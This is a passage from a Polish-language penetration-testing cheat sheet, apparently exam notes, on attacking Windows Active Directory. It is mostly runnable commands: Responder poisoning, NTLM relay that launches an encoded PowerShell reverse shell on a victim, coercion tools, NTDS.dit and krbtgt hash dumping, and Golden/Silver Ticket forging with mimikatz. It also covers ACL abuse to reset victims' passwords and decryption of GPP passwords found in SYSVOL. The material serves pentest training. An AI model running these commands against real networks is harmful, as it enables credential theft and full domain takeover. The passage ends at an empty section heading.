> **Idea:** gdy Windows nie rozwiąże nazwy przez DNS, rozgłasza zapytanie **LLMNR/NBT-NS** do całej podsieci ("gdzie jest \\fileserver?"). Responder odpowiada „to ja!", ofiara próbuje się uwierzytelnić i **wysyła Ci NetNTLMv2 hash**. Klasyk na wejściu do sieci wewnętrznej, gdy nie masz jeszcze żadnych poświadczeń.

```bash
# Nasłuchuj i truj na interfejsie tunelowym/lan (uruchom NA POCZĄTKU, działa w tle):
sudo responder -I eth0 -dwv
# -I interfejs | -d odpowiadaj na NBT-NS domenowe | -w serwer WPAD | -v verbose
```
Złapane hashe lądują w logu + na ekranie (format hashcat):
```bash
ls -la /usr/share/responder/logs/
hashcat -m 5600 netntlmv2.txt /usr/share/wordlists/rockyou.txt   # 5600 = NetNTLMv2
```
> 💡 **NetNTLMv2 hash da się łamać, ale NIE da się nim robić pass-the-hash.** Jeśli hasło jest mocne i nie łamie się → przekaż go dalej relayem (§5.5).

**Wymuszenie uwierzytelnienia** (nie czekaj, aż ktoś sam się pomyli — sprowokuj):
```bash
# Jeśli masz już niski shell/dostęp do share: wskaż ofierze plik na Twoim hoscie
# (ikona/plik na share, e-mail, itp.) - dowolne odwołanie do \\ATTACKER\x wyśle hash.
# Narzędzia: ntlm_theft (generuje .lnk/.scf/.url), lub wstrzyknięcie ścieżki UNC do formularza.
```
> ⚠️ **Egzamin/produkcja:** przed relayem **WYŁĄCZ** wbudowane serwery SMB i HTTP Respondera w `/etc/responder/Responder.conf` (`SMB = Off`, `HTTP = Off`), bo inaczej zajmą porty, których potrzebuje `ntlmrelayx`.

## 5.5 NTLM Relay (ntlmrelayx) — przekazanie zamiast łamania

> **Idea:** zamiast łamać złapany hash, **przekaż uwierzytelnienie w locie** do innej maszyny i wykonaj tam akcję z uprawnieniami ofiary. Warunek: **SMB signing = disabled/not required** na celu (sprawdź niżej). To najczęstsza droga z „mam hash, ale się nie łamie" do shella/creds.

**Krok 0 — znajdź cele bez SMB signing:**
```bash
crackmapexec smb 10.10.10.0/24 --gen-relay-list targets.txt   # zapisze hosty z signing:False
# lub: nmap --script smb2-security-mode -p445 10.10.10.0/24
```
**Krok 1 — Responder truje, ale bez własnego SMB/HTTP** (patrz warning wyżej).

**Krok 2 — ntlmrelayx łapie i przekazuje:**
```bash
# Dump SAM/hashy na celu (gdy relayowany user jest tam lokalnym adminem):
impacket-ntlmrelayx -tf targets.txt -smb2support

# Interaktywny SMB client po udanym relayu (-i → łączysz się przez nc 127.0.0.1 <port>):
impacket-ntlmrelayx -tf targets.txt -smb2support -i

# Odpal komendę / reverse shell na celu:
impacket-ntlmrelayx -t smb://VICTIM_IP -smb2support -c 'powershell -enc <BASE64_REVSHELL>'

# Relay do LDAP na DC → np. dodanie komputera / RBCD / dump domeny:
impacket-ntlmrelayx -t ldap://$DC --escalate-user twoj_user
```
> 🎯 **Killer combo (OSCP AD):** wymuś auth konta maszynowego/admina (Responder / PetitPotam / PrinterBug) → relay do **LDAPS na DC** → skonfiguruj **RBCD** albo **Shadow Credentials** → uzyskaj TGT jako DA. Alternatywnie relay SMB → `--dump-laps` / secretsdump.

**Powiązane techniki wymuszania auth (coercion):**
```bash
python3 PetitPotam.py -u user -p pass $LHOST $DC      # MS-EFSRPC coercion
python3 printerbug.py $DOMAIN/user:pass@$DC $LHOST     # MS-RPRN (spooler) coercion
coercer coerce -u user -p pass -t $DC -l $LHOST        # zbiorczy coercer
```

> **Mapa decyzji (mam NetNTLMv2 hash — co dalej?):**
> 1. Spróbuj złamać: `hashcat -m 5600` → jak pęknie, masz plaintext (używaj wszędzie).
> 2. Nie pęka? → **relay** (§5.5), o ile cel ma SMB signing off.
> 3. Signing wszędzie on i hash mocny? → wróć do innych wektorów (Kerberoast, misconfig, web).

## 5.6 Domain dominance — Golden / Silver Ticket + NTDS.dit

> Po zdobyciu DA / hasha **krbtgt** możesz fałszować bilety Kerberos = trwała dominacja nad domeną. Tylko w autoryzowanym zakresie.

### Dump NTDS.dit (baza haseł całej domeny)
```bash
# Zdalnie przez DCSync (uprawnienia replikacji — DA/Administrators):
impacket-secretsdump -just-dc $DOMAIN/jeffadmin:'Haslo123!'@$DC             # całe NTDS.dit
impacket-secretsdump -just-dc-user krbtgt $DOMAIN/jeffadmin:'Haslo123!'@$DC  # tylko krbtgt (pod golden)
```
```cmd
:: Offline na DC (jako DA) — ntds.dit jest zablokowany, więc zrób Volume Shadow Copy:
vshadow.exe -nw -p C:                                :: utwórz shadow (-nw bez writerów=szybciej); ZANOTUJ 'Shadow copy device name'
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
reg.exe save hklm\system c:\system.bak               :: SYSTEM hive potrzebny do odszyfrowania NTDS
```
```bash
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL           # parsuj offline (przenieś oba .bak na Kali)
```
> Z NTDS masz NTLM wszystkich kont (w tym `krbtgt:502:...:HASH`) + klucze Kerberos (AES). Hash krbtgt = klucz do Golden Ticket. `vshadow.exe` to podpisana binarka z Windows SDK. **DCSync (§5.2) jest cichszy** — nie dotyka dysku ani nie zostawia śladu narzędzi.

### Backup Operators → DC (SeBackupPrivilege, BEZ shella i bez DA)

> 🎯 **Kiedy:** masz konto (np. z DCC2/spray), które jest w grupie **`Backup Operators`** (sygnał: `adminCount=1`, a `net user X /domain` pokazuje `*Backup Operators`). Ta grupa daje **`SeBackupPrivilege`** = prawo czytać dowolny plik/klucz rejestru z pominięciem ACL. Cel: zrzucić hive'y DC → wyciągnąć **hash konta maszyny `DC01$`** → **DCSync** (konto komputera DC ma prawa replikacji) → cała domena. Konto NIE musi być adminem ani mieć WinRM.

**Krok 1 — potwierdź członkostwo (LDAP, dowolne creds):**
```bash
# kandydaci uprzywilejowani (adminCount=1):
proxychains -q nxc ldap $DC -u joe -p 'Flowers1' -d medtech.com --admin-count
proxychains -q nxc ldap $DC -u yoshi -p 'Mushroom!' -d medtech.com --query "(sAMAccountName=joe)" "memberOf"
#   -> memberOf: CN=Backup Operators,CN=Builtin,...
```

**Krok 2 — zrzuć hive'y DC przez WinReg (SeBackupPrivilege), zapisując do NETLOGON:**
```bash
# reg backup pisze jako SYSTEM; katalog scripts(NETLOGON) jest czytelny dla KAŻDEGO uwierzytelnionego usera
proxychains -q impacket-reg medtech.com/joe:'Flowers1'@$DC backup -o 'C:\Windows\SYSVOL\domain\scripts'
#   [*] Saved HKLM\SAM / SYSTEM / SECURITY to ...\scripts\*.save
```
> Dlaczego NETLOGON: `C:\Windows\Temp` jest za ACL (nie-admin nie czyta `C$`), ale `...\SYSVOL\domain\scripts` = share **NETLOGON**, do którego authenticated users mają odczyt. SYSTEM tam zapisze, my odczytamy jako joe.

**Krok 3 — pobierz hive'y jako ten sam nie-admin user (share NETLOGON):**
```bash
proxychains -q impacket-smbclient medtech.com/joe:'Flowers1'@$DC
#   use NETLOGON ; get SAM.save ; get SYSTEM.save ; get SECURITY.save ; exit
```

**Krok 4 — offline: wyciągnij hash konta maszyny DC01$:**
```bash
impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
#   [*] $MACHINE.ACC:  aad3b435...:<HASH_DC01$>     <- to jest klucz
```

**Krok 5 — DCSync kontem maszyny DC (ma prawa replikacji!):**
```bash
proxychains -q impacket-secretsdump -just-dc -hashes :<HASH_DC01$> 'medtech.com/DC01$@'$DC
#   -> Administrator:500:...:<HASH>  krbtgt:502:...:<HASH>  <DA>:...  = cała domena
```

**Krok 6 — PtH domenowym Administratorem → flaga na DC + reszta hostów:**
```bash
proxychains -q impacket-wmiexec -hashes :<HASH_Administrator> medtech.com/Administrator@$DC   # type ...\proof.txt
# domenowy Administrator = admin lokalny wszędzie:
proxychains -q nxc smb 172.16.224.0/24 -u Administrator -H <HASH_Administrator> -d medtech.com -x "whoami"
```
> 💎 Ten łańcuch omija to, że konto nie jest adminem ani nie ma WinRM — liczy się tylko przynależność do `Backup Operators` + zasięg RPC/SMB do DC (tu przez pivot §8.3). Alternatywa z shellem: `SeBackupPrivilege` + `diskshadow`/`robocopy /b` na `ntds.dit` (§5 wyżej).

### Golden Ticket (fałszywy TGT — dowolny user, cała domena)
> Potrzebne: NTLM **krbtgt** + **SID** domeny. Ważny nawet po zmianie hasła ofiary (krbtgt rzadko rotowany). Forsowanie+wstrzyknięcie biletu **nie wymaga admina** i działa z maszyny spoza domeny.
```
mimikatz # privilege::debug
mimikatz # lsadump::lsa /patch          :: na DC — wyciągnij hash krbtgt (RID 502) i SID domeny
mimikatz # kerberos::purge             :: wyczyść istniejące bilety PRZED wstrzyknięciem
mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
mimikatz # misc::cmd                    :: otwórz nowy cmd z wstrzykniętym biletem
```
```cmd
PsExec.exe \\dc1 cmd.exe                :: po NAZWIE hosta (nie IP!) → Kerberos; potem: whoami /groups → Domain/Enterprise/Schema Admins
```
> `/ptt` = wstrzyknij bilet od razu. ⚠️ Od lipca 2022 (KB5008380 / CVE-2021-42287) **musisz podać ISTNIEJĄCE konto** (`/user:jen`) — dawniej działała dowolna nazwa. Domyślnie bilet dostaje grupy 512/513/518/519/520.

### Silver Ticket (fałszywy TGS — jedna usługa, ciszej)
> **Dlaczego działa:** usługa ufa grupom wpisanym w bilecie i (domyślnie) **nie waliduje PAC** u DC — więc podrobiony TGS z dowolnym członkostwem przechodzi bez ruchu do DC = trudny do wykrycia. Ważny na WSZYSTKIE serwery dzielące ten sam SPN/konto usługi.
> Potrzebne 3 rzeczy: **hash konta usługi** (`/rc4:`) + **SID domeny** + **docelowy SPN**.
```powershell
# 1. SID domeny — obetnij ostatni RID (-XXXX) z wyniku:
whoami /user
# 2. hash konta usługi — z sekurlsa (usługa musi mieć sesję na hoście, gdzie jesteś adminem):
#    mimikatz # sekurlsa::logonpasswords
# 3. sprawdź dostęp PRZED (spodziewaj się 401):
iwr -UseDefaultCredentials http://web04
```
```
mimikatz # kerberos::golden /user:jeffadmin /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /target:web04.corp.com /service:http /rc4:<hash_konta_uslugi> /ptt
```
```powershell
# 4. weryfikacja PO — teraz 200 zamiast 401:
klist
iwr -UseDefaultCredentials http://web04
```

---

# 6. Active Directory

> 🔗 Setup BloodHound graph: https://happycamper84.medium.com/howto-setup-bloodhound-map-ad-44c7149ba28b
> 🔗 PowerSploit/PowerView: https://github.com/PowerShellMafia/PowerSploit

> 🎯 **Drogowskaz — co po kolei robić w AD (z hosta domenowego):**
> 1. **Poznaj siebie** — swój SID + WSZYSTKIE grupy (też zagnieżdżone). Prawa często wisi na grupie, nie na Tobie. `whoami /groups`, `Get-DomainGroup -MemberIdentity <ja>`.
> 2. **Zmapuj domenę** — userzy, grupy, komputery, SPN-y, polityka haseł (§6.2). Cel: lista kont + gdzie co stoi.
> 3. **Szukaj szybkich winów** — AS-REP (§1.8), Kerberoast (§5.3), hasła w `description`, `Find-LocalAdminAccess`, `Find-DomainShare -CheckShareAccess`.
> 4. **ACL abuse** (§6.5) — kto ma potężne prawo nad kim (`Find-InterestingDomainAcl`). Znajdź GenericAll/WriteDacl/ForceChangePassword → przejmij konto → **powtórz enumerację z nowego kontekstu**. To pętla, nie jeden strzał.
> 5. **Ruch boczny** — z sesji admina/hasha/biletu skacz dalej: PtH/Overpass/PtT (§7.2), WMI/WinRM/PsExec/DCOM (§7.1). Po każdym hoście → dumpuj LSASS (§5.2) i szukaj nowych creds.
> 6. **Eskaluj do domeny** — gdy dojdziesz do DA/DCSync → NTDS.dit, Golden/Silver Ticket (§5.6).
>
> ⚙️ **Setup:** wchodź na hosta przez **RDP** (`xfreerdp /u: /d: /v:`), nie WinRM/PSRemoting — inaczej trafisz na **Kerberos double-hop** i narzędzia enum przestaną sięgać do DC. Skrypty odpalaj po `powershell -ep bypass`. Po każdym nowym foothold **powtórz całą enumerację** — uprawnienia różnią się per konto.
>
> 💎 **Co jest wartościowe (na co polować):** konta z SPN (Kerberoast) · konta `DONT_REQ_PREAUTH` (AS-REP) · hasła w `description`/`info`/GPP · prawa ACL (GenericAll/WriteDacl/GenericWrite/ForceChangePassword) · local admin (`Find-LocalAdminAccess`) · sesje adminów (`Get-NetSession`) · share'y z zapisem/creds (`-CheckShareAccess`) · grupy z „Admin" w nazwie · zagnieżdżenia grup (członek grupy A, która jest w uprzywilejowanej B).

## 6.1 Zbieranie danych — SharpHound / BloodHound

**SharpHound.exe** — kolektor na hoście domenowym (Windows):
```
.\SharpHound.exe --CollectionMethods All --Domain tryhackme.loc --ExcludeDCs
```
**SharpHound.ps1** (ingestor PowerShell) — gdy wolisz nie zrzucać .exe:
```powershell
Import-Module .\Sharphound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\Public\ -OutputPrefix "corp_audit"
Invoke-BloodHound -CollectionMethod All -Stealth                       # mniej dotknięć LDAP/hostów (ciszej)
Invoke-BloodHound -CollectionMethod All -Loop -LoopDuration 00:30:00 -LoopInterval 00:05:00   # łap sesje pojawiające się PÓŹNIEJ
Invoke-BloodHound -CollectionMethod All -ZipPassword P@ss123           # zaszyfruj wynikowy .zip
```
> Kolekcja to migawka z Twojej perspektywy — user logujący się po pierwszym zrzucie zostanie pominięty → `-Loop`. Usuń plik cache `.bin` po zbiórce (niepotrzebny do analizy).
**bloodhound-python** — kolektor z Linuxa (potrzeba poświadczeń):
```bash
bloodhound-python -u asrepuser1 -p 'qwerty123!' -d $DOMAIN -ns $DC -c All --zip
```
Uruchomienie GUI (import ZIP-a przez drag&drop):
```bash
sudo neo4j start                    # baza (login http://localhost:7474, domyślny user neo4j)
bloodhound                          # aplikacja GUI
# stop: sudo neo4j stop
```
**Co analizować w BloodHound** dla wybranego obiektu:
- *Object information* — nazwa, typ, domena
- *Sessions* — aktywne sesje logowania
- *Member of* — członkostwo w grupach
- *Local admin privileges* — gdzie jest lokalnym adminem
- *Execution privileges* — RDP/PSRemote
- *Outbound/Inbound object control* — prawa nad innymi obiektami i odwrotnie
- **Prebuilt queries** → "Shortest Path to Domain Admins" = złota ścieżka

> 🎯 **Workflow „owned" (praktyczna pętla foothold → DA):** prawy-klik na każdym koncie/hoście, który kontrolujesz → **Mark as Owned** (czaszka) → `Analysis > Shortest Paths to Domain Admins from Owned Principals` (zwraca **NO DATA**, dopóki czegoś nie oznaczysz!). Prawy-klik na **krawędzi** między węzłami → **? Help > Abuse** = gotowe komendy exploitacji + **Opsec**. Krawędzie: `AdminTo` (local admin), `HasSession` (creds w pamięci → ukradnij), ACL (`GenericAll`/`WriteDacl`/`ForceChangePassword` → §6.5). **Klasyk:** DA ma `HasSession` na hoście, gdzie masz `AdminTo` → zaloguj się i zrzuć jego creds z LSASS.

## 6.2 Enumeracja z hosta domenowego (manual → PowerView → moduł AD)

> Trzy poziomy tego samego: **ręcznie przez LDAP/.NET** (nic nie instalujesz, nie zrzucasz podejrzanych narzędzi na dysk), **PowerView** (szybki recon ofensywny) i **moduł ActiveDirectory** (natywny, „czysty”). Na maszynie bez internetu i z AV — manual ratuje.

### A. Ręczna enumeracja przez LDAP (.NET / ADSI, bez narzędzi)
Namierz kontroler domeny (PDC) i bazowy DN:
```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = $domainObj.PdcRoleOwner.Name           # nazwa DC (PDC emulator)
$DN  = ([adsi]'').distinguishedName            # np. DC=corp,DC=com
$LDAP = "LDAP://$PDC/$DN"
```
Surowe zapytanie DirectorySearcher (użytkownicy = `samAccountType=805306368`):
```powershell
$direntry    = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.filter = "samAccountType=805306368"
$result = $dirsearcher.FindAll()
Foreach($obj in $result){ Foreach($prop in $obj.Properties){ $prop } }   # wypisz atrybuty
```
Funkcja wielokrotnego użytku (wklej raz, potem odpytuj dowolnym filtrem LDAP):
```powershell
function LDAPSearch {
    param ([string]$LDAPQuery)
    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName
    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")
    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
    return $DirectorySearcher.FindAll()
}
```
Najczęstsze filtry LDAP:
```powershell
LDAPSearch -LDAPQuery "(samAccountType=805306368)"           # wszyscy użytkownicy
LDAPSearch -LDAPQuery "(objectclass=group)"                  # wszystkie grupy
LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))"       # konkretna grupa
LDAPSearch -LDAPQuery "(objectCategory=computer)"            # komputery
LDAPSearch -LDAPQuery "(&(objectCategory=person)(servicePrincipalName=*))"   # konta z SPN → Kerberoast
# Członkowie grupy (w tym zagnieżdżeni) — atrybut 'member':
foreach ($g in $(LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Development Department*))")){ $g.properties.member }
# Członkostwo usera — atrybut 'memberof':
foreach ($o in $(LDAPSearch -LDAPQuery "(name=jeffadmin)")){ $o.properties.memberof }
```
> Atrybuty warte czytania: `samaccountname`, `memberof`, `serviceprincipalname` (Kerberoast), `useraccountcontrol` (`DONT_REQ_PREAUTH` → AS-REP, `TRUSTED_FOR_DELEGATION` → delegacja), `pwdlastset`+`lastlogon` (stare = **konto uśpione** = cichsze przejęcie + słabsze hasło sprzed zmiany polityki), `description` (często leżą tam hasła!), `operatingsystem`.

> **Z hosta SPOZA domeny** (masz creds, ale nie jesteś zalogowany do domeny) — podaj poświadczenia wprost do `DirectoryEntry`:
```powershell
$user = 'corp\jen'
$pass = 'Nexus123!'
$LDAP = "LDAP://DC01.corp.com/DC=corp,DC=com"
$directoryEntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP, $user, $pass)   # 3. arg = user, 4. = hasło
$searcher = New-Object System.DirectoryServices.DirectorySearcher($directoryEntry, "(samAccountType=805306368)")
$searcher.FindAll()
```
> ⚠️ **Ślepa plamka `net.exe`:** `net group "X" /domain` pokazuje tylko **userów** — pomija zagnieżdżone GRUPY i grupy Domain Local. Manualny LDAP (`objectclass=group`) / PowerView widzą wszystko → dlatego enumerujesz przez LDAP, nie tylko `net`.

### B. SPN — ręcznie (pod Kerberoasting, §5.3)
```cmd
setspn -L iis_service            :: SPN-y konkretnego konta (setspn jest natywnie na Windows)
```
```powershell
LDAPSearch -LDAPQuery "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"
```

### C. PowerView (recon ofensywny)
```powershell
Import-Module .\PowerView.ps1
Get-NetDomain                                     # info o domenie (nazwa, DC-e)
Get-NetUser | select cn,pwdlastset,lastlogon       # userzy + wybrane atrybuty
Get-NetUser -SPN | select samaccountname,serviceprincipalname   # konta z SPN (Kerberoast)
Get-NetGroup | select cn                           # grupy
Get-NetGroup "Domain Admins" | select member       # członkowie grupy
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion   # hosty + OS
Find-LocalAdminAccess                              # gdzie jestem lokalnym adminem
Get-NetSession -ComputerName files04               # kto ma sesję na hoscie (namierz adminów)
Find-DomainShare -CheckShareAccess                 # share'y, do KTÓRYCH mam dostęp (bez flagi = wszystkie)
Get-ObjectAcl -Identity stephanie                  # ACL obiektu (kto ma nad nim prawa); nowsza nazwa: Get-DomainObjectAcl
Find-InterestingDomainAcl -ResolveGUIDs            # ciekawe prawa (GenericAll/WriteDacl...) w całej domenie
Convert-SidToName S-1-5-21-...-1104                # SID → nazwa (obowiązkowe do czytania ACL-i)
Invoke-Kerberoast                                  # od razu wyciąga hashe TGS-REP
```
> `Get-NetSession` + `Find-LocalAdminAccess` = mapowanie ścieżek lateral movement bez BloodHound. `Get-ObjectAcl` + `Find-InterestingDomainAcl` = szukanie ścieżek ACL-owych (masz np. WriteDacl nad kontem admina → przejmujesz je). **Pełny łańcuch ACL abuse → §6.5, domain shares/SYSVOL → §6.6.**

**Kto jest zalogowany (logged-on users → namierzanie adminów):**
```powershell
Get-NetSession -ComputerName files04 -Verbose      # -Verbose ujawnia prawdziwe "Access is denied" vs pusty wynik (brak sesji)
Get-NetSession -ComputerName client74              # workstacje userów zwykle ODPOWIADAJĄ → tu szukaj sesji
Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl   # klucz SrvsvcSessionInfo — brak 'Authenticated Users' = zdalny enum zablokowany
.\PsLoggedon.exe \\files04                          # Sysinternals — alternatywa (wymaga usługi Remote Registry na celu)
```
> Przyczyna: od ~Win10 build 1709 / Server 2019 usunięto „Authenticated Users" z ACL klucza **SrvsvcSessionInfo** → zwykły user nie odczyta sesji zdalnie. Enumeruj `operatingsystemversion` (Get-NetComputer) → **starsze hosty** wciąż pozwalają. `PsLoggedon` zależy od Remote Registry (default off na stacjach, często on na serwerach).

### D. Moduł ActiveDirectory (natywny, „czysty”)
```powershell
Get-Module -ListAvailable ActiveDirectory ; Import-Module ActiveDirectory
Get-ADUser -Filter *                              # wszyscy użytkownicy
Get-ADUser -Identity <user> -Properties *         # szczegóły (w tym description!)
Get-ADUser -Filter "Name -like '*admin*'"          # konta 'admin'
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName   # konta z SPN
Get-ADGroup -Filter * | select name                # grupy
Get-ADGroupMember -Identity "Domain Admins"        # członkowie grupy
Get-ADComputer -Filter * -Properties OperatingSystem | select name,OperatingSystem
Get-ADDefaultDomainPasswordPolicy                  # polityka haseł (SPRAWDŹ przed sprayingiem!)
```

### Grupy warte uwagi
> Domain Admins / Administrators = klucze do całego AD. Enterprise Admins = multi-domain forest.
> Server Operators, Backup Operators = uprzywilejowane wbudowane. Cokolwiek z "Admin" w nazwie (np. "SQL Admins").

## 6.3 net / wmic (cmd)

```cmd
net user /domain                 :: userzy domeny (bez /domain = lokalni)
net user <username> /domain      :: info o userze domeny
net group /domain                :: grupy domeny
net group "Group Name" /domain   :: członkowie grupy
net localgroup                   :: grupy lokalne
net localgroup Administrators    :: lokalni admini
query user                       :: zalogowane sesje (alias quser)
tasklist /V                      :: procesy + konta
net session                      :: sesje SMB
net view \\dc01 /all             :: share'y na hoscie
```
WMIC — usługi i konta serwisowe (szukaj DomainName\username → reużycie creds):
```cmd
wmic service get Name,StartName
:: PS: Get-WmiObject Win32_Service | select Name, StartName
```

## 6.4 MSSQL w AD (patrz też §2.1)
```bash
impacket-mssqlclient Administrator:Lab123@$IP -windows-auth
```

## 6.5 ACL abuse — przejęcie konta przez uprawnienia obiektu

> Jedna z najczęstszych ścieżek w AD: Twoje konto (albo grupa, w której jesteś) ma **potężne prawo nad innym obiektem**. To pętla: *enumeruj prawa → nadużyj → zaloguj się jako ofiara → enumeruj ponownie z jej kontekstu → …* aż dojdziesz do celu/flagi.

### Prawa, które dają przejęcie
| Prawo (ActiveDirectoryRights / ACE) | Co pozwala | Nadużycie |
|---|---|---|
| **GenericAll** | pełna kontrola | reset hasła / dodanie SPN / wszystko |
| **User-Force-Change-Password** | wymuś zmianę hasła | `Set-DomainUserPassword` |
| **GenericWrite / WriteProperty** | zapis atrybutów | targeted Kerberoast (ustaw SPN) lub logon script |
| **WriteDacl** | zapis ACL | dopisz sobie GenericAll → reset |
| **WriteOwner** | zmiana właściciela | zostań ownerem → WriteDacl → GenericAll |
| **AllExtendedRights** | wszystkie prawa rozszerzone | m.in. force-change-password, odczyt LAPS/gMSA |
| **Self / Self-Membership** | dopisanie SIEBIE | dodaj się do grupy (nad którą masz Self) |
| **AddMember (nad grupą)** | zapis `member` | dodaj się do uprzywilejowanej grupy |

### Krok 1 — enumeracja ACL (poprawnie: OBA wymiary)
> ⚠️ Najczęstszy błąd: filtrowanie tylko po SID usera i tylko po obiektach-userach → fałszywe „nic tu nie ma". Prawa wisi na **grupach** i nad **grupami/komputerami**.
```powershell
# principal = mój SID + SID-y WSZYSTKICH moich grup (też zagnieżdżone)
$sids  = @()
$sids += (Get-DomainUser  -Identity <ja>).objectsid
$sids += (Get-DomainGroup -MemberIdentity <ja>).objectsid

# cel = WSZYSTKIE obiekty (users, groups, computers), nie tylko userzy
Get-DomainObjectAcl -Identity * -ResolveGUIDs |
  ? { $sids -contains $_.SecurityIdentifier } |
  select ObjectDN, ActiveDirectoryRights, ObjectAceType, SecurityIdentifier
```
Alternatywa szybka: `Find-InterestingDomainAcl -ResolveGUIDs | ? { $_.IdentityReferenceName -eq '<ja>' }`

**Jak czytać wynik:** `SecurityIdentifier`/`IdentityReferenceName` = kto ma prawo (Twój SID/grupa) · `ObjectDN` = nad kim · `ActiveDirectoryRights` = jakie prawo · `ObjectAceType` (dzięki `-ResolveGUIDs`) = np. `User-Force-Change-Password`. `AccessMask 983551` = pełny GenericAll.

### Krok 2 — nadużycie (dobierz do prawa)
```powershell
# GenericAll / ForceChangePassword → reset hasła ofiary (nie musisz znać starego):
$np = ConvertTo-SecureString 'Passw0rd!2024' -AsPlainText -Force
Set-DomainUserPassword -Identity <ofiara> -AccountPassword $np -Verbose

# GenericWrite → targeted Kerberoast (nie psujesz konta — czystsze niż reset):
Set-DomainObject -Identity <ofiara> -Set @{serviceprincipalname='fake/svc'} -Verbose
Get-DomainSPNTicket -Identity <ofiara>          # hash TGS-REP → hashcat -m 13100 (offline)
Set-DomainObject -Identity <ofiara> -Clear serviceprincipalname   # POSPRZĄTAJ

# WriteDacl → dopisz sobie GenericAll, potem reset jak wyżej:
Add-DomainObjectAcl -TargetIdentity <ofiara> -PrincipalIdentity <ja> -Rights All -Verbose

# AddMember nad grupą → dodaj się do niej (aktywuje prawa grupy):
Add-DomainGroupMember -Identity '<Grupa>' -Members <ja> -Verbose
```

### Krok 3 — zaloguj się jako ofiara
```cmd
runas /user:<DOMENA>\<ofiara> powershell        :: na hoście, w kontekście ofiary
```
Z Kali: `xfreerdp /u:<ofiara> /p:'Passw0rd!2024' /v:<host>`  albo  `evil-winrm -i <IP> -u <ofiara> -p 'Passw0rd!2024'`. Weryfikacja: `whoami ; whoami /groups`.

### Krok 4 — enumeruj ponownie z kontekstu ofiary → flaga / kolejny skok
```powershell
$sid2 = (Get-DomainUser -Identity <ofiara>).objectsid
Get-DomainObjectAcl -Identity * -ResolveGUIDs | ? { $_.SecurityIdentifier -eq $sid2 } |
  select ObjectDN, ActiveDirectoryRights, ObjectAceType
Find-LocalAdminAccess ; Find-DomainShare -CheckShareAccess    # nowy dostęp dopiero jako ofiara
Get-DomainUser -Identity <ofiara> -Properties description,info,memberof   # flaga bywa w description
```
Jeśli ofiara ma prawo nad kolejnym obiektem → powtórz Krok 1–4. Jeśli to koniec łańcucha → flaga zwykle w `description`/`info`, na pulpicie ofiary, albo na share dostępnym z jej konta.

> ⚠️ **Tradecraft:** reset hasła jest destrukcyjny (blokuje prawdziwego usera) — w labie OK, w realnym teście wybieraj Kerberoast/SPN gdy masz GenericWrite i ZAWSZE sprzątaj dopisane SPN-y/ACL-e/członkostwa. Odnotuj każdą zmianę do raportu.

### Czytanie ACL — SID → nazwa
> Output ACL ma `SecurityIdentifier` jako surowy SID. Zawsze go rozwiń, żeby wiedzieć KTO to:
```powershell
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
# wiele naraz (np. wszystkie SID-y z GenericAll nad grupą):
"S-1-5-...-512","S-1-5-...-1104","S-1-5-32-548" | Convert-SidToName
# widok ACL grupy filtrowany po prawie:
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
```

### Nadużycie AddMember natywnie (net) + sprzątanie
```cmd
net group "Management Department" stephanie /add /domain    :: dodaj się do grupy
net group "Management Department" stephanie /del /domain     :: POSPRZĄTAJ po sobie
```
```powershell
Get-NetGroup "Management Department" | select member         # weryfikacja (przed i po)
```

## 6.6 Domain shares & SYSVOL (GPP cpassword)

> Share'y to skarbnica: skrypty z hasłami, backupy, klucze — a **SYSVOL** (czytelny dla każdego usera domeny) często zawiera stare GPP z zaszyfrowanym hasłem (`cpassword`), które odszyfrujesz publicznym kluczem.

```powershell
Find-DomainShare -CheckShareAccess                 # share'y, do których MAM dostęp
# przejrzyj SYSVOL (replikowany na wszystkie DC, czytelny dla domeny):
ls \\dc1.corp.com\sysvol\corp.com\
ls \\dc1.corp.com\sysvol\corp.com\Policies\
# GPP z hasłem — Groups.xml / *-policy-backup.xml zawierają pole cpassword:
cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
# poluj rekurencyjnie po całym SYSVOL:
Get-ChildItem \\dc1.corp.com\sysvol\ -Recurse -Include *.xml,*.ps1,*.bat,*.vbs -ErrorAction SilentlyContinue | Select-String -Pattern "cpassword|password|net use"
```
Odszyfrowanie `cpassword` na Kali (klucz AES jest publiczny — MS go opublikował):
```bash
gpp-decrypt "j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"
# alternatywnie: impacket-Get-GPPPassword / crackmapexec smb $IP -u u -p p -M gpp_password
```
> 💎 **Czego szukać na share'ach:** `cpassword` w Groups.xml/Services/ScheduledTasks/DataSources · pliki `unattend.xml`/`sysprep.xml` · skrypty logowania z `net use ... /user:` · `.kdbx`/`.ppk`/`id_rsa` · configi z connection stringami · backupy (`*.bak`, `*.vhd`, NTDS). Zapis do share z logon-scriptem = możliwość podłożenia payloadu.

---

## 6.7 Assumed-Breach Walkthrough — od usera do Domain Admina

